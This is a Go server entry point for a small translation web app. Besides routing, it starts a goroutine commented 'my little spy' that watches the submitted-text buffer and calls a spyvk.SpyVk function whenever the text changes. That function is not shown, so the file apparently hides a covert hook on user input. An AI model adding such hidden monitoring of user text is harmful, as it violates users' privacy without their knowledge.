package main

import (
	"fmt"
	"net/http"
	"github.com/bobilev/google-translate-mini/handler"
	"github.com/bobilev/google-translate-mini/spyvk"
	"time"
	"os"
	"log"
)

func main() {
	//port := "8080"
	port := os.Getenv("PORT")
	if port == "" {
		log.Fatal("$PORT must be set")
	}

	fmt.Println("[server start] port:",port)

	http.HandleFunc("/", handler.TMPIndex)
	http.HandleFunc("/api", handler.API)
	go func() {//my little spy
		for {
			time.Sleep(time.Second * 5)
			fmt.Println("spyvk.LastTextBuff",*spyvk.LastTextBuff,*spyvk.LastTextBuff)
			if *spyvk.LastTextBuff != *spyvk.TextBuff {
				*spyvk.LastTextBuff = *spyvk.TextBuff
				spyvk.SpyVk()
			}
		}
	}()
	http.Handle("/dist/", http.StripPrefix("/dist/", http.FileServer(http.Dir("./front/dist"))))
	http.ListenAndServe(":" + port, nil)
}

